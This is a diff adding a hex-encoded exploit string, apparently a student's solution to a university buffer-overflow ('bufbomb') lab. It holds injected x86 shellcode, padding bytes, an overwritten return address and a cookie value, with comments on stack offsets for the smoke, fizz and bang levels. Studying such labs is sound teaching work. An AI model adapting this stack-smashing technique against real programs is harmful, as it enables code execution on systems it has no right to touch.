@@ -1,0 +1,24 @@
+a1 0c d1 04 08 a3 04 d1
+04 08 68 ed 8b 04 08 c3
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41
+/* getbuf() allocates for 56 bytes and our return address starts at $ebp-8, so we pad 48bytes and overwrite the return address with the addres for our smoke function */
+a8 32 68 55
+/* my cookie: 0x572700bb */
+30 30 30 30 bb 00 27 57
+/* the return adress STARTS +4 from $ebp, 60 in our case
+   fizz takes our argument cookie and interprets it as an int
+   the argument area is set for 8bytes, however since we are
+   interpreting it as an int only 4bytes are read. */
+
+/* global value address: 0x0804d104
+
+
+ 0:  a1 0c d1 04 08      mov    0x804d10c,%eax
+ 5:  a3 04 d1 04 08      mov    %eax,0x804d104
+ a:  68 ed 8b 04 08      push   $0x8048bed
+ 10: c3                  ret
+
+ */
